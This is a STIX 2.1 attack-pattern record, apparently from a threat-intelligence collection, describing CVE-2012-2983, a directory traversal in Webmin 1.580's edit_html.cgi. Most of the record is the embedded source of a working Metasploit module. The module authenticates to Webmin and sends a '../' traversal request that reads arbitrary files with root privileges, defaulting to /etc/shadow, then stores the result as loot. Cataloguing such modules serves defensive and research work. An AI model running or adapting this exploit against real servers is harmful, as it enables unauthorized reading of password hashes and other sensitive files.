{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--50707bc4-31f4-49d2-8f6d-bd114fa8ddeb",
    "created": "2024-08-14T16:22:38.597634Z",
    "modified": "2024-08-14T16:22:38.597639Z",
    "name": "Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access",
    "description": " This module exploits a directory traversal in Webmin 1.580. The vulnerability exists in the edit_html.cgi component and allows an authenticated user with access to the File Manager Module to access arbitrary files with root privileges. The module has been tested successfully with Webmin 1.580 over Ubuntu 10.04. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/webmin/edit_html_fileaccess.rb",
            "external_id": "edit_html_fileaccess.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-2983"
        },
        {
            "source_name": "reference",
            "url": "http://www.americaninfosec.com/research/dossiers/AISG-12-002.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/webmin/webmin/commit/4cd7bad70e23e4e19be8ccf7b9f245445b2b3b80"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access',\n      'Description'    => %q{\n          This module exploits a directory traversal in Webmin 1.580. The vulnerability\n        exists in the edit_html.cgi component and allows an authenticated user with access\n        to the File Manager Module to access arbitrary files with root privileges. The\n        module has been tested successfully with Webmin 1.580 over Ubuntu 10.04.\n      },\n      'Author'         => [\n        'Unknown', # From American Information Security Group\n        'juan vazquez' # Metasploit module\n      ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '85247'],\n          ['BID', '55446'],\n          ['CVE', '2012-2983'],\n          ['URL', 'http://www.americaninfosec.com/research/dossiers/AISG-12-002.pdf'],\n          ['URL', 'https://github.com/webmin/webmin/commit/4cd7bad70e23e4e19be8ccf7b9f245445b2b3b80']\n        ],\n      'DisclosureDate' => '2012-09-06',\n      'Actions'        =>\n        [\n          ['Download', 'Description' => 'Download arbitrary file']\n        ],\n      'DefaultAction'  => 'Download'\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(10000),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n        OptString.new('USERNAME',  [true, 'Webmin Username']),\n        OptString.new('PASSWORD',  [true, 'Webmin Password']),\n        OptInt.new('DEPTH', [true, 'Traversal depth', 4]),\n        OptString.new('RPATH', [ true, \"The file to download\", \"/etc/shadow\" ])\n      ])\n  end\n\n  def run\n\n    peer = \"#{rhost}:#{rport}\"\n\n    print_status(\"Attempting to login...\")\n\n    data = \"page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}\"\n\n    res = send_request_cgi(\n      {\n        'method'  => 'POST',\n        'uri'     => \"/session_login.cgi\",\n        'cookie'  => \"testing=1\",\n        'data'    => data\n      }, 25)\n\n    if res and res.code == 302 and res.get_cookies =~ /sid/\n      session = res.get_cookies.scan(/sid\\=(\\w+)\\;*/).flatten[0] || ''\n      if session and not session.empty?\n        print_good \"Authentication successful\"\n      else\n        print_error \"Authentication failed\"\n        return\n      end\n    else\n      print_error \"Authentication failed\"\n      return\n    end\n\n    print_status(\"Attempting to retrieve #{datastore['RPATH']}...\")\n\n    traversal = \"../\" * datastore['DEPTH']\n    traversal << datastore['RPATH']\n    data = \"file=#{traversal}&text=1\"\n\n    res = send_request_cgi(\n      {\n        'method'  => 'GET',\n        'uri'     => \"/file/edit_html.cgi?#{data}\",\n        'cookie'  => \"sid=#{session}\"\n      }, 25)\n\n    if (res and res.code == 200 and res.body =~ /#{traversal}/ and res.body =~ /name=body>(.*)<\\/textarea>/m)\n      loot = $1\n      f = ::File.basename(datastore['RPATH'])\n      path = store_loot('webmin.file', 'application/octet-stream', rhost, loot, f, datastore['RPATH'])\n      print_good(\"#{datastore['RPATH']} saved in #{path}\")\n    else\n      print_error(\"Failed to retrieve the file\")\n      return\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-09-06"
}